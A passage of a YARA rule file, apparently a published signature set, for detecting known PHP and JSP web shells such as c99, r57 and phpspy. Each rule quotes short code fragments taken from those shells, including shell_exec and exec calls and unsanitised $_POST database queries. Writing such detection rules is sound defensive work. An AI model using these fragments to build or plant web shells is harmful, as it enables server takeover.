      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "return new Double(format.format(value)).doubleValue();" fullword
      $s5 = "File tempF = new File(savePath);" fullword
      $s9 = "if (tempF.isDirectory()) {" fullword
   condition: 
      2 of them
}

rule Webshell_c99_c99shell_2_RID2F58 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:53:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d3f38a6dc54a73d304932d9227a739ec"
      hash2 = "157b4ac3c7ba3a36e546e81e9279eab5"
      hash3 = "048ccc01b873b40d57ce25a4c56ea717"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "$bindport_pass = \"c99\";" fullword
      $s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr" 
   condition: 
      1 of them
}

rule Webshell_r57shell_antichat_RID3147 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:15:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "513b7be8bd0595c377283a7c87b44b2e"
      hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
      hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d" 
      $s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
      $s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
      $s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
   condition: 
      2 of them
}

rule Webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx_RID360A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:38:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4745d510fed4378e4b1730f56f25e569"
      hash2 = "f3ca29b7999643507081caab926e2e74"
      hash3 = "46a18979750fa458a04343cf58faa9bd"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "BODY, TD, TR {" fullword
      $s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
      $s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
   condition: 
      2 of them
}

rule Webshell_css_dm_he1p_xxx_RID30B3 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:51:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
      hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "String savePath = request.getParameter(\"savepath\");" fullword
      $s4 = "URL downUrl = new URL(downFileUrl);" fullword
      $s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
      $s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
      $s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
      $s8 = "URLConnection conn = downUrl.openConnection();" fullword
      $s9 = "sis = request.getInputStream();" fullword
   condition: 
      4 of them
}

rule Webshell_JSP_icesword_RID2F52 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:52:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9abd397c6498c41967b4dd327cf8b55a"
      hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
      hash3 = "56c005690da2558690c4aa305a31ad37"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
      $s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
      $s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
   condition: 
      2 of them
}

rule Webshell_JFolder_JSP_2_RID2F29 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:45:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
      hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
      hash3 = "8979594423b68489024447474d113894"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol" 
      $s2 = " KB </td>" fullword
      $s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\"" 
      $s4 = "<!-- <tr align=\"center\"> " fullword
   condition: 
      all of them
}

rule Webshell_phpspy_2006_PHPSPY_RID30B4 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:51:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "42f211cec8032eb0881e87ebdb3d7224"
      hash2 = "40a1f840111996ff7200d18968e42cfe"
      hash3 = "0712e3dc262b4e1f98ed25760b206836"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "http://www.4ngel.net" fullword
      $s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
      $s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
      $s9 = "Codz by Angel" fullword
   condition: 
      2 of them
}

rule Webshell_c99_locus7s_c99_w4cking_xxx_RID34BB : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:43:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9c34adbc8fd8d908cbb341734830f971"
      hash2 = "ef43fef943e9df90ddb6257950b3538f"
      hash3 = "ae025c886fbe7f9ed159f49593674832"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$res = @shell_exec($cfe);" fullword
      $s8 = "$res = @ob_get_contents();" fullword
      $s9 = "@exec($cfe,$res);" fullword
   condition: 
      2 of them
}

rule Webshell_browser_201_3_ma_ma2_download_RID3571 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:13:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a7e25b8ac605753ed0c438db93f6c498"
      hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
      hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
      $s2 = "private static String tempdir = \".\";" fullword
      $s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\"" 
   condition: 
      2 of them
}

rule Webshell_000_403_c5_queryDong_spyjsp2010_RID350B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:56:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "8b457934da3821ba58b06a113e0d53d9"
      hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val" 
      $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa" 
      $s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName(" 
      $s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
   condition: 
      2 of them
}

rule Webshell_r57shell127_r57_kartal_r57_RID338E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:52:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
      hash2 = "4108f28a9792b50d95f95b9e5314fa1e"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
      $s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
      $s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_" 
   condition: 
      2 of them
}


